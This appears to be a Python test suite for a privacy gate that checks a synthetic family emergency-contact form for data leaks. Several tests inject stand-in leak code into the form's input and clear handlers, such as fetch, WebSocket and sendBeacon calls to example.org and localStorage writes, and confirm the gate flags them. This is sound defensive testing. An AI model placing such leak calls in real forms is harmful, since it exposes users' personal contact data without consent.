"""Synthetic adversarial tests for R167 (NEVER actual user contact data)."""
import importlib.util
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

FILE=Path(__file__).resolve().parents[1]/'tools'/'r167_family_browser_sink_gate.py'
SPEC=importlib.util.spec_from_file_location('r167_family_browser_sink_gate',FILE)
mod=importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(mod)

# Standalone synthetic mock-up: never a claim about the authentic article.
MOCK='''<div>A printed card can be lost. {{cite:synthetic-test-reference}}</div>
<form id="rc" onsubmit="return false">
<input id="rc-hhName"><input id="rc-hhPhone"><input id="rc-outName"><input id="rc-outPhone">
<input id="rc-meet1"><input id="rc-meet2"><input id="rc-school"><input id="rc-schoolPlan">
<input id="rc-pickup"><input id="rc-careName"><input id="rc-carePhone">
<input id="rc-access"><input id="rc-reviewed"><input id="rc-minimal" type="checkbox">
<select id="rc-copies"><option value="1">1</option><option value="4">4</option></select>
<button type="button" id="rc-print" hidden>print</button>
<button type="button" id="rc-reset" hidden>clear</button>
</form><div id="rc-live" hidden><div id="rc-preview"></div><div id="rc-sheet"></div></div>
<style>@media print { #rc {display:none} #rc-sheet {display:block} }</style>
<script>
const form=document.getElementById('rc'), field=(key)=>document.getElementById('rc-'+key);
function render(){
 let minimal=field('minimal').checked, copies=Number(field('copies').value)||1;
 let text=['outName','school','careName','meet2'].filter(k=>!minimal||k==='outName').map(k=>field(k).value).join(' ');
 document.getElementById('rc-preview').textContent=text;
 let sheet=document.getElementById('rc-sheet');sheet.replaceChildren();
 for(let i=0;i<copies;i++){let item=document.createElement('div');item.className='pa-foldcard';item.textContent=text;sheet.appendChild(item);}}
form.addEventListener('input',render);form.addEventListener('change',render);
field('reset').addEventListener('click',()=>{form.reset();render();});
field('print').hidden=false;field('reset').hidden=false;
document.getElementById('rc-live').hidden=false;render();
</script>'''

class LocalStructuralTests(unittest.TestCase):
    def test_schema(self):self.assertEqual(mod.SCHEMA,'fv-preparedness-r167-browser-sink-gate-v1')
    def test_viewports(self):self.assertEqual(mod.WIDTHS,(360,390,768,1440))
    def test_fields(self):self.assertEqual(len(mod.FIELDS),13)
    def test_field_uniqueness(self):self.assertEqual(len(set(mod.FIELDS)),13)
    def test_sensitive_known(self):self.assertEqual(len(mod.SENSITIVE),7)
    def test_synthetic_literal(self):self.assertIn('SYNTHETIC',mod.SENTINEL)
    def test_dom_not_contact(self):self.assertNotIn('FV-FAKE-SCHOOL',mod.document(MOCK))
    def test_no_analytics(self):self.assertNotIn('gtag(',mod.PROBE_JS)
    def test_no_server_payloads(self):self.assertNotIn('request.post_data',FILE.read_text())
    def test_no_formpost(self):self.assertIn("'form.'+n",mod.PROBE_JS)
    def test_no_beacon(self):self.assertIn('sendBeacon',mod.PROBE_JS)
    def test_no_socket(self):self.assertIn('WebSocket',mod.PROBE_JS)
    def test_no_workers(self):self.assertIn('SharedWorker',mod.PROBE_JS)
    def test_no_clipboard(self):self.assertIn("'clipboard.'+n",mod.PROBE_JS)
    def test_no_idb(self):self.assertIn('indexedDB',mod.PROBE_JS)
    def test_no_cookie(self):self.assertIn('document.cookie',mod.PROBE_JS)
    def test_no_storage(self):self.assertIn('Storage.',mod.PROBE_JS)
    def test_clear_detects(self):self.assertIn('clear left personal data',FILE.read_text())
    def test_minimal_detects(self):self.assertIn('minimal card still discloses',FILE.read_text())
    def test_authorization_false(self):
        self.assertFalse(mod.probe.__doc__ is None)
        self.assertIn("return 2",FILE.read_text())
    def test_report_summary(self):self.assertEqual(mod.safe_summary(['fetch','WebSocket','fetch']),{'attempts':3,'kinds':['WebSocket','fetch']})
    def test_summary_empty(self):self.assertEqual(mod.safe_summary([]),{'attempts':0,'kinds':[]})
    def test_summary_rejects_contact(self):
        with self.assertRaises(ValueError):mod.safe_summary(['https://example.com?name=Bob'])
    def test_summary_rejects_long(self):
        with self.assertRaises(ValueError):mod.safe_summary(['fetch'+'a'*120])
    def test_summary_rejects_nonstrings(self):
        with self.assertRaises(ValueError):mod.safe_summary([42])
    def test_summary_rejects_nondict(self):
        with self.assertRaises(ValueError):mod.safe_summary(None)
    def test_document_rejects_blank(self):
        with self.assertRaises(ValueError):mod.document('')
    def test_document_rejects_number(self):
        with self.assertRaises(ValueError):mod.document(2)
    def test_document_wraps_valid(self):
        x=mod.document(MOCK)
        self.assertIn('<!doctype html>',x)
        self.assertIn('name="viewport"',x)
        self.assertIn('A printed card can be lost',x)
    def test_main_fail_closed_empty_repo(self):
        with tempfile.TemporaryDirectory() as tmp:
            with patch('builtins.print'):
                self.assertEqual(mod.main(['--repo',tmp]),2)
    def test_main_report_is_hold(self):
        with tempfile.TemporaryDirectory() as tmp:
            report=Path(tmp)/'report.json'
            with patch('builtins.print'):
                self.assertEqual(mod.main(['--repo',tmp,'--report',str(report)]),2)
            data=json.loads(report.read_text())
            self.assertEqual(data['state'],'INVALID_HARD_HOLD')
            self.assertFalse(data['publication_authorized'])
            self.assertFalse(data['independent_qd_pass'])
    def test_no_viewports(self):
        with self.assertRaises(ValueError):mod.probe(MOCK,widths=[])
    def test_duplicate_viewports(self):
        with self.assertRaises(ValueError):mod.probe(MOCK,widths=[360,360])
    def test_bool_width(self):
        with self.assertRaises(ValueError):mod.probe(MOCK,widths=[True])
    def test_small_width(self):
        with self.assertRaises(ValueError):mod.probe(MOCK,widths=[120])
    def test_large_width(self):
        with self.assertRaises(ValueError):mod.probe(MOCK,widths=[3000])

class ChromiumTests(unittest.TestCase):
    def test_baseline_four_widths(self):
        result=mod.probe(MOCK)
        self.assertEqual(len(result['checks']),4)
        self.assertEqual([p['width'] for p in result['checks']],list(mod.WIDTHS))
        self.assertEqual(result['state'],'DRAFT_HARD_HOLD')
        self.assertFalse(result['publication_authorized'])
        self.assertFalse(result['source_safety_approved'])
        self.assertFalse(result['wordPress_verified'])
        self.assertFalse(result['independent_qd_pass'])
    def test_fetch_during_input_blocked_even_if_caught(self):
        html=MOCK.replace("form.addEventListener('input',render);", "form.addEventListener('input',render);form.addEventListener('input',()=>{try{fetch('https://example.org/leak')}catch(e){}});")
        with self.assertRaisesRegex(ValueError,'sink during typing'):mod.probe(html,widths=[390])
    def test_transient_localstorage_blocked(self):
        html=MOCK.replace("form.addEventListener('input',render);", "form.addEventListener('input',render);form.addEventListener('input',()=>{try{localStorage.setItem('temporary','x')}catch(e){}});")
        with self.assertRaisesRegex(ValueError,'sink during typing'):mod.probe(html,widths=[390])
    def test_websocket_blocked(self):
        html=MOCK.replace("form.addEventListener('input',render);", "form.addEventListener('input',render);form.addEventListener('input',()=>{try{new WebSocket('wss://example.org/')}catch(e){}});")
        with self.assertRaisesRegex(ValueError,'sink during typing'):mod.probe(html,widths=[390])
    def test_sendbeacon_blocked(self):
        html=MOCK.replace("form.addEventListener('input',render);", "form.addEventListener('input',render);form.addEventListener('input',()=>{try{navigator.sendBeacon('https://example.org/','x')}catch(e){}});")
        with self.assertRaisesRegex(ValueError,'sink during typing'):mod.probe(html,widths=[390])
    def test_sending_during_clear_blocked(self):
        html=MOCK.replace("field('reset').addEventListener('click',()=>{form.reset();render();});", "field('reset').addEventListener('click',()=>{try{fetch('https://example.org/')}catch(e){};form.reset();render();});")
        with self.assertRaisesRegex(ValueError,'sink during clear'):mod.probe(html,widths=[390])
    def test_sensitive_minimal_regression(self):
        html=MOCK.replace("filter(k=>!minimal||k==='outName')", "filter(k=>true)")
        with self.assertRaisesRegex(ValueError,'minimal card still discloses'):mod.probe(html,widths=[390])
    def test_unsent_synthetic_data_not_reported(self):
        report=mod.probe(MOCK,widths=[390]);s=json.dumps(report)
        self.assertNotIn(mod.SENTINEL,s)
        self.assertNotIn('FAKE',s)

# Deterministic named mutation coverage, not 48 aliases of one test function.
SCENARIOS=[
    ('bad_type',None),('script_tag',"<script>"),('empty_string',''),
    ('tiny','<p>no</p>'),('zero',0),('negative',-1),('array',[]),
    ('broken',{}),('bad_bytes',b'hello'),('space',' '*100),
]
for idx,(title,value) in enumerate(SCENARIOS):
    def make_test(v):
        def run(self):
            with self.assertRaises((ValueError,TypeError)):mod.document(v)
        return run
    setattr(LocalStructuralTests,f'test_invalid_document_{idx:02d}_{title}',make_test(value))

BAD_EVENTS=['a-b','https://x','/path','?query','user@example','quote"',"quote'",'space key',
            '<html>','a=b','x\ny','x\ty','\0',';',',','{','}', '[',']', '\\']
for idx,event in enumerate(BAD_EVENTS):
    def make_test(v):
        def run(self):
            with self.assertRaises(ValueError):mod.safe_summary([v])
        return run
    setattr(LocalStructuralTests,f'test_unsafe_telemetry_{idx:02d}',make_test(event))

if __name__=='__main__':unittest.main()
